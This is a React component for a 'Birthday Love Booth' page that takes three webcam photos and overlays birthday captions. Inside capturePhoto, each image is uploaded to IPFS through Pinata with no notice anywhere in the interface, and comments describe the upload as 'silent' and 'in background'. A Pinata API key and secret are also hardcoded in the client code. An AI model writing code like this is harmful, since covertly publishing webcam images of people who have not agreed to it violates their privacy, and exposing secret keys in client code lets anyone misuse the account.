import React, { useState, useRef, useCallback } from 'react';
import Webcam from 'react-webcam';
import { Camera, ArrowRight, RotateCcw, Sparkles, Heart, Star, Gift, Upload, CheckCircle, AlertCircle } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
interface BirthdayPhoto {
  id: number;
  dataUrl: string;
  template: string;
  message: string;
  style: string;
  ipfsHash?: string;
  uploadStatus?: 'pending' | 'uploading' | 'success' | 'error';
}

const PhotoCapture: React.FC = () => {
  const webcamRef = useRef<Webcam>(null);
  const [isCameraOpen, setIsCameraOpen] = useState(false);
  const [capturedPhotos, setCapturedPhotos] = useState<BirthdayPhoto[]>([]);
  const [currentPhotoIndex, setCurrentPhotoIndex] = useState(0);
  const [deviceId, setDeviceId] = useState<string | undefined>(undefined);
  const navigate=useNavigate();
  // Pinata API credentials
  const PINATA_API_KEY = 'f86c105cb1bd861fb931';
  const PINATA_SECRET_API_KEY = '367050a5a5538ca2d9b65c09b3e1b7cc4cf92b1a6e99877e07302ae236a5cd86';

  const birthdayTemplates = [
    {
      template: "birthday-sparkle",
      message: "Another year of amazing! ✨",
      style: "bg-gradient-to-br from-pink-400 via-rose-400 to-purple-600 text-white"
    },
    {
      template: "birthday-heart",
      message: "Birthday wishes & love! 💕",
      style: "bg-gradient-to-br from-red-400 via-pink-400 to-rose-500 text-white"
    },
    {
      template: "birthday-star",
      message: "Shine bright, birthday star! ⭐",
      style: "bg-gradient-to-br from-yellow-400 via-pink-400 to-orange-500 text-white"
    }
  ];

  // Convert data URL to Blob
  const dataURLtoBlob = (dataURL: string): Blob => {
    const arr = dataURL.split(',');
    const mime = arr[0].match(/:(.*?);/)?.[1] || 'image/jpeg';
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) {
      u8arr[n] = bstr.charCodeAt(n);
    }
    return new Blob([u8arr], { type: mime });
  };

  // Upload to IPFS via Pinata (silent upload)
  const uploadToIPFS = async (photo: BirthdayPhoto): Promise<string> => {
    try {
      const blob = dataURLtoBlob(photo.dataUrl);
      const formData = new FormData();
      formData.append('file', blob, `birthday-${photo.id}.jpg`);
      
      // Add metadata
      formData.append('pinataMetadata', JSON.stringify({
        name: `Birthday Photo ${photo.id}`,
        keyvalues: {
          template: photo.template,
          message: photo.message
        }
      }));

      const response = await fetch('https://api.pinata.cloud/pinning/pinFileToIPFS', {
        method: 'POST',
        headers: {
          'pinata_api_key': PINATA_API_KEY,
          'pinata_secret_api_key': PINATA_SECRET_API_KEY
        },
        body: formData
      });

      if (!response.ok) {
        throw new Error(`Upload failed: ${response.statusText}`);
      }

      const data = await response.json();
      const ipfsHash = data.IpfsHash;
      console.log('Uploaded to IPFS:', ipfsHash);
      return ipfsHash;
    } catch (error) {
      console.error('IPFS upload error:', error);
      throw error;
    }
  };

  const startCamera = () => {
    setIsCameraOpen(true);
  };

  const stopCamera = () => {
    setIsCameraOpen(false);
  };

  const capturePhoto = useCallback(() => {
    if (webcamRef.current) {
      const imageSrc = webcamRef.current.getScreenshot();
      if (imageSrc) {
        const template = birthdayTemplates[currentPhotoIndex % birthdayTemplates.length];

        const newPhoto: BirthdayPhoto = {
          id: Date.now(),
          dataUrl: imageSrc,
          template: template.template,
          message: template.message,
          style: template.style,
          uploadStatus: 'pending'
        };

        setCapturedPhotos(prev => {
          const updatedPhotos = [...prev, newPhoto];
          if (updatedPhotos.length >= 3) {
            stopCamera();
          }
          return updatedPhotos;
        });

        setCurrentPhotoIndex(prev => prev + 1);

        // Upload to IPFS silently in background
        uploadToIPFS(newPhoto)
          .then(ipfsHash => {
            setCapturedPhotos(prev => 
              prev.map(photo => 
                photo.id === newPhoto.id 
                  ? { ...photo, ipfsHash, uploadStatus: 'success' }
                  : photo
              )
            );
          })
          .catch(error => {
            console.error('Background upload failed:', error);
            setCapturedPhotos(prev => 
              prev.map(photo => 
                photo.id === newPhoto.id 
                  ? { ...photo, uploadStatus: 'error' }
                  : photo
              )
            );
          });
      }
    }
  }, [currentPhotoIndex, birthdayTemplates]);

  const retakePhoto = (index: number) => {
    setCapturedPhotos(prev => prev.filter((_, i) => i !== index));
    setCurrentPhotoIndex(prev => prev - 1);
    if (!isCameraOpen && capturedPhotos.length <= 3) {
      startCamera();
    }
  };

  const retakeAll = () => {
    setCapturedPhotos([]);
    setCurrentPhotoIndex(0);
    startCamera();
  };

  const getPhotoIcon = (templateType: string) => {
    switch (templateType) {
      case "birthday-sparkle":
        return <Sparkles className="w-8 h-8 text-pink-300 drop-shadow-lg" />;
      case "birthday-heart":
        return <Heart className="w-8 h-8 text-rose-300 drop-shadow-lg" />;
      case "birthday-star":
        return <Star className="w-8 h-8 text-yellow-300 drop-shadow-lg" />;
      default:
        return <Gift className="w-8 h-8 text-purple-300 drop-shadow-lg" />;
    }
  };

  

  const videoConstraints = {
    width: 1280,
    height: 720,
    facingMode: "user"
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-pink-100 via-rose-50 to-purple-100 relative overflow-hidden">
      {/* Animated Background Elements */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-10 left-10 w-20 h-20 bg-pink-300 rounded-full opacity-20 animate-pulse"></div>
        <div className="absolute top-32 right-20 w-16 h-16 bg-rose-300 rounded-full opacity-30 animate-bounce"></div>
        <div className="absolute bottom-20 left-1/4 w-24 h-24 bg-purple-300 rounded-full opacity-25 animate-pulse"></div>
        <div className="absolute bottom-40 right-1/3 w-12 h-12 bg-pink-400 rounded-full opacity-20 animate-bounce"></div>
        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-gradient-to-r from-pink-200 to-purple-200 rounded-full opacity-10 animate-pulse"></div>
      </div>

      {/* Floating Hearts */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        {[...Array(8)].map((_, i) => (
          <div
            key={i}
            className="absolute animate-pulse"
            style={{
              left: `${Math.random() * 100}%`,
              top: `${Math.random() * 100}%`,
              animationDelay: `${Math.random() * 5}s`,
              animationDuration: `${3 + Math.random() * 2}s`
            }}
          >
            <Heart className="w-4 h-4 text-pink-300 opacity-30" />
          </div>
        ))}
      </div>

      <div className="relative z-10 max-w-6xl mx-auto px-4 py-12">
        <div className="text-center mb-16">
          <div className="flex justify-center items-center mb-6">
            <div className="relative">
              <Camera className="w-16 h-16 text-pink-500 mr-4 drop-shadow-lg animate-pulse" />
              <div className="absolute -top-2 -right-2 w-6 h-6 bg-rose-400 rounded-full animate-ping"></div>
            </div>
            <div className="relative">
              <Gift className="w-20 h-20 text-purple-500 animate-bounce drop-shadow-xl" />
              <div className="absolute -top-3 -right-3 w-8 h-8 bg-pink-400 rounded-full animate-pulse"></div>
            </div>
            <div className="relative">
              <Camera className="w-16 h-16 text-pink-500 ml-4 drop-shadow-lg animate-pulse" />
              <div className="absolute -top-2 -left-2 w-6 h-6 bg-rose-400 rounded-full animate-ping"></div>
            </div>
          </div>
          <h1 className="text-6xl font-bold bg-gradient-to-r from-pink-500 via-rose-500 to-purple-600 bg-clip-text text-transparent mb-6 drop-shadow-lg">
            💕 Birthday Love Booth 💕
          </h1>
          <p className="text-2xl font-semibold bg-gradient-to-r from-pink-400 to-purple-500 bg-clip-text text-transparent">
            {capturedPhotos.length === 0 
              ? "Let's capture 3 moments of pure love! 💖📸" 
              : `${capturedPhotos.length}/3 precious memories captured 💕`}
          </p>
        </div>

        {capturedPhotos.length < 3 && (
          <div className="mb-16">
            {!isCameraOpen ? (
              <div className="text-center">
                <div className="max-w-md mx-auto bg-white/80 backdrop-blur-sm p-8 rounded-3xl shadow-2xl border border-pink-200 mb-8 relative overflow-hidden">
                  <div className="absolute inset-0 bg-gradient-to-br from-pink-50 to-purple-50 opacity-50"></div>
                  <div className="relative z-10">
                    <div className="flex justify-center mb-6">
                      <div className="relative">
                        {getPhotoIcon(birthdayTemplates[currentPhotoIndex % birthdayTemplates.length].template)}
                        <div className="absolute -inset-2 bg-gradient-to-r from-pink-400 to-purple-400 rounded-full opacity-20 animate-pulse"></div>
                      </div>
                    </div>
                    <h3 className="text-3xl font-bold bg-gradient-to-r from-pink-500 to-purple-600 bg-clip-text text-transparent mb-3">
                      Photo {currentPhotoIndex + 1} of 3
                    </h3>
                    <p className="text-xl font-semibold text-pink-600">
                      {birthdayTemplates[currentPhotoIndex % birthdayTemplates.length].message}
                    </p>
                  </div>
                </div>
                
                <button
                  onClick={startCamera}
                  className="relative group bg-gradient-to-r from-pink-500 via-rose-500 to-purple-600 hover:from-pink-600 hover:via-rose-600 hover:to-purple-700 text-white font-bold py-6 px-12 rounded-full text-2xl shadow-2xl hover:shadow-3xl transition-all duration-500 transform hover:scale-110 overflow-hidden"
                >
                  <div className="absolute inset-0 bg-gradient-to-r from-pink-400 to-purple-500 opacity-0 group-hover:opacity-20 transition-opacity duration-500"></div>
                  <div className="relative z-10 flex items-center">
                    <Camera className="w-8 h-8 mr-3 animate-pulse" />
                    {capturedPhotos.length === 0 ? '💕 Start Love Booth 💕' : '💖 Capture Next Love 💖'}
                  </div>
                </button>
              </div>
            ) : (
              <div className="max-w-lg mx-auto">
                <div className="relative bg-white/90 backdrop-blur-sm p-8 rounded-3xl shadow-2xl border border-pink-200 overflow-hidden">
                  <div className="absolute inset-0 bg-gradient-to-br from-pink-50 to-purple-50 opacity-60"></div>
                  <div className="relative z-10">
                    <div className="text-center mb-6">
                      <h3 className="text-3xl font-bold bg-gradient-to-r from-pink-500 to-purple-600 bg-clip-text text-transparent mb-2">
                        Photo {currentPhotoIndex + 1} of 3
                      </h3>
                      <p className="text-xl font-semibold text-pink-600">
                        {birthdayTemplates[currentPhotoIndex % birthdayTemplates.length].message}
                      </p>
                    </div>
                    
                    <div className="relative rounded-2xl overflow-hidden border-4 border-white shadow-xl">
                      <Webcam
                        ref={webcamRef}
                        audio={false}
                        screenshotFormat="image/jpeg"
                        videoConstraints={videoConstraints}
                        className="w-full h-80 object-cover"
                      />
                      <div className="absolute inset-0 border-4 border-pink-300 rounded-2xl pointer-events-none animate-pulse"></div>
                    </div>
                    
                    <div className="flex justify-center space-x-6 mt-6">
                      <button
                        onClick={capturePhoto}
                        className="relative group bg-gradient-to-r from-pink-500 to-purple-600 hover:from-pink-600 hover:to-purple-700 text-white p-6 rounded-full shadow-xl transform hover:scale-125 transition-all duration-300 overflow-hidden"
                      >
                        <div className="absolute inset-0 bg-white opacity-0 group-hover:opacity-20 transition-opacity duration-300"></div>
                        <Camera className="w-10 h-10 relative z-10" />
                      </button>
                      
                      <button
                        onClick={stopCamera}
                        className="bg-gradient-to-r from-gray-400 to-gray-600 hover:from-gray-500 hover:to-gray-700 text-white p-6 rounded-full shadow-xl transform hover:scale-125 transition-all duration-300"
                      >
                        <RotateCcw className="w-8 h-8" />
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            )}
          </div>
        )}

        {capturedPhotos.length > 0 && (
          <div className="mb-16">
            <div className="grid md:grid-cols-3 gap-8">
              {capturedPhotos.map((photo, index) => (
                <div key={photo.id} className="relative group">
                  <div className="bg-white/90 backdrop-blur-sm p-4 rounded-3xl shadow-2xl border border-pink-200 transform hover:scale-105 transition-all duration-500 overflow-hidden">
                    <div className="absolute inset-0 bg-gradient-to-br from-pink-50 to-purple-50 opacity-60"></div>
                    <div className="relative z-10">
                      <div className="relative overflow-hidden rounded-2xl">
                        <img
                          src={photo.dataUrl}
                          alt={`Birthday love photo ${index + 1}`}
                          className="w-full h-72 object-cover"
                        />
                        
                        {/* Love Template overlay */}
                        <div className="absolute inset-0 pointer-events-none">
                          <div className={`absolute bottom-0 left-0 right-0 p-4 ${photo.style}`}>
                            <div className="flex items-center justify-between">
                              <div className="flex items-center space-x-2">
                                {getPhotoIcon(photo.template)}
                                <span className="font-bold text-lg drop-shadow-lg">
                                  {photo.message}
                                </span>
                              </div>
                              <div className="text-sm opacity-90 bg-white/20 px-2 py-1 rounded-full">
                                {index + 1}/3
                              </div>
                            </div>
                          </div>
                          
                          {/* Floating love decorations */}
                          <div className="absolute top-4 right-4">
                            <div className="w-10 h-10 bg-white/30 rounded-full flex items-center justify-center backdrop-blur-sm">
                              <Heart className="w-6 h-6 text-white animate-pulse" />
                            </div>
                          </div>
                          
                          <div className="absolute top-4 left-4">
                            <div className="w-10 h-10 bg-white/30 rounded-full flex items-center justify-center backdrop-blur-sm">
                              <Star className="w-6 h-6 text-white animate-pulse" />
                            </div>
                          </div>
                        </div>
                      </div>
                      
                      <button
                        onClick={() => retakePhoto(index)}
                        className="absolute -top-2 -right-2 bg-gradient-to-r from-pink-500 to-rose-500 hover:from-pink-600 hover:to-rose-600 text-white p-3 rounded-full shadow-xl opacity-0 group-hover:opacity-100 transition-all duration-300 transform hover:scale-125"
                      >
                        <RotateCcw className="w-5 h-5" />
                      </button>
                    </div>
                  </div>
                </div>
              ))}
              
              {/* Love placeholder for remaining photos */}
              {Array.from({ length: 3 - capturedPhotos.length }, (_, index) => (
                <div key={`placeholder-${index}`} className="relative">
                  <div className="bg-white/60 backdrop-blur-sm p-6 rounded-3xl shadow-xl border-2 border-dashed border-pink-300 overflow-hidden">
                    <div className="absolute inset-0 bg-gradient-to-br from-pink-50 to-purple-50 opacity-60"></div>
                    <div className="relative z-10 w-full h-72 flex items-center justify-center rounded-2xl bg-white/40">
                      <div className="text-center">
                        <div className="flex justify-center mb-4">
                          <div className="relative">
                            {getPhotoIcon(birthdayTemplates[(capturedPhotos.length + index) % birthdayTemplates.length].template)}
                            <div className="absolute -inset-2 bg-gradient-to-r from-pink-400 to-purple-400 rounded-full opacity-20 animate-pulse"></div>
                          </div>
                        </div>
                        <p className="text-pink-600 font-bold text-xl mb-2">
                          💕 Love Photo {capturedPhotos.length + index + 1} 💕
                        </p>
                        <p className="text-pink-500 font-semibold text-sm">
                          {birthdayTemplates[(capturedPhotos.length + index) % birthdayTemplates.length].message}
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {capturedPhotos.length === 3 && (
          <div className="text-center mb-16">
            <div className="bg-white/80 backdrop-blur-sm p-10 rounded-3xl shadow-2xl max-w-3xl mx-auto border border-pink-200 relative overflow-hidden">
              <div className="absolute inset-0 bg-gradient-to-br from-pink-50 to-purple-50 opacity-60"></div>
              <div className="relative z-10">
                <div className="flex justify-center mb-6">
                  <div className="relative">
                    <Gift className="w-20 h-20 text-pink-500 animate-bounce drop-shadow-xl" />
                    <div className="absolute -inset-3 bg-gradient-to-r from-pink-400 to-purple-400 rounded-full opacity-20 animate-pulse"></div>
                  </div>
                </div>
                <h2 className="text-4xl font-bold bg-gradient-to-r from-pink-500 via-rose-500 to-purple-600 bg-clip-text text-transparent mb-6">
                  💕 Beautiful Love Memories Created! 💕
                </h2>
                <p className="text-xl text-pink-700 leading-relaxed mb-8 font-semibold"> 
                  Each one captures a unique moment of pure joy, love, and celebration.💖✨
                </p>
                <button
                  onClick={retakeAll}
                  className="bg-gradient-to-r from-pink-400 via-rose-400 to-purple-500 hover:from-pink-500 hover:via-rose-500 hover:to-purple-600 text-white font-bold py-3 px-8 rounded-full text-lg shadow-xl hover:shadow-2xl transform hover:scale-110 transition-all duration-500"
                >
                  <RotateCcw className="w-5 h-5 inline mr-2" />
                  💕 Create New Love Photos 💕
                </button>
              </div>
            </div>
          </div>
        )}

        <div className="text-center">
          <button
            onClick={() => navigate('/iloveyou')}
            className="relative group bg-gradient-to-r from-pink-500 via-rose-500 to-purple-600 hover:from-pink-600 hover:via-rose-600 hover:to-purple-700 text-white font-bold py-4 px-10 rounded-full text-xl shadow-2xl hover:shadow-3xl transform hover:scale-110 transition-all duration-500 overflow-hidden"
          >
            <div className="absolute inset-0 bg-white opacity-0 group-hover:opacity-20 transition-opacity duration-500"></div>
            <div className="relative z-10 flex items-center justify-center">
              💖 Continue Love Journey 💖
              <div className="ml-2">
                <ArrowRight className="w-6 h-6" />
              </div>
            </div>
          </button>
        </div>
      </div>
    </div>
  );
};

export default PhotoCapture;
